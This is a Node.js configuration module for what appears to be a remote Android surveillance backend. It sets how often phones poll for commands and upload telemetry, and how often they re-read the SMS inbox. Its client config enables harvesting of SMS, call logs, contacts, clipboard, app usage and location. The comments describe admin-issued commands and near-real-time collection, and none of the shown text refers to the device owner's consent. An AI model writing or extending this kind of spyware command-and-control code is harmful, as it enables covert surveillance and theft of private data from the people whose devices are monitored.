'use strict';

// Sync cadence handed to clients. Overridable via SYNC_INTERVAL_S so a lab can
// drive near-real-time collection (3 s floor) without editing code; the Android
// client clamps its own polling loop to >= 2 s and accepts values in 1..600 s.
const DEFAULT_SYNC_INTERVAL = 60;
const MIN_SYNC_INTERVAL = 3;
const MAX_SYNC_INTERVAL = 600;

// Two independent cadences:
//   SYNC_INTERVAL  - how often the device polls /commands and uploads telemetry.
//                    This is the command latency, so a lab can drop it to 3 s.
//   SMS_INTERVAL   - how often the device re-reads the SMS inbox. The product
//                    requirement is one minute, independent of the poll rate, so a
//                    fast poll does not turn into a hot inbox query.
const DEFAULT_SMS_INTERVAL = 60;
const MIN_SMS_INTERVAL = 3;
const MAX_SMS_INTERVAL = 3600;

function clamp(raw, fallback, min, max) {
  const parsed = Number.parseInt(String(raw ?? ''), 10);
  if (!Number.isFinite(parsed)) return fallback;
  return Math.min(max, Math.max(min, parsed));
}

const SYNC_INTERVAL = clamp(
  process.env.SYNC_INTERVAL_S, DEFAULT_SYNC_INTERVAL, MIN_SYNC_INTERVAL, MAX_SYNC_INTERVAL
);
const SMS_INTERVAL = clamp(
  process.env.SMS_INTERVAL_S, DEFAULT_SMS_INTERVAL, MIN_SMS_INTERVAL, MAX_SMS_INTERVAL
);

// Per-device override of the SMS cadence (devices.sms_interval_s). It is set by
// the set_sms_interval command, so the value the admin asked for is persisted and
// re-sent on every poll instead of being overwritten by the global default.
function smsIntervalFor(device) {
  const raw = device && device.sms_interval_s;
  if (raw === undefined || raw === null) return SMS_INTERVAL;
  return clamp(raw, SMS_INTERVAL, MIN_SMS_INTERVAL, MAX_SMS_INTERVAL);
}

function clientConfig(device) {
  return {
    collect_sms: true,
    collect_call_logs: true,
    collect_contacts: true,
    collect_clipboard: true,
    collect_usage: true,
    collect_location: true,
    capture_interval_s: SYNC_INTERVAL,
    sms_interval_s: smsIntervalFor(device),
  };
}

module.exports = {
  SYNC_INTERVAL,
  SMS_INTERVAL,
  MIN_SMS_INTERVAL,
  MAX_SMS_INTERVAL,
  smsIntervalFor,
  clientConfig,
};
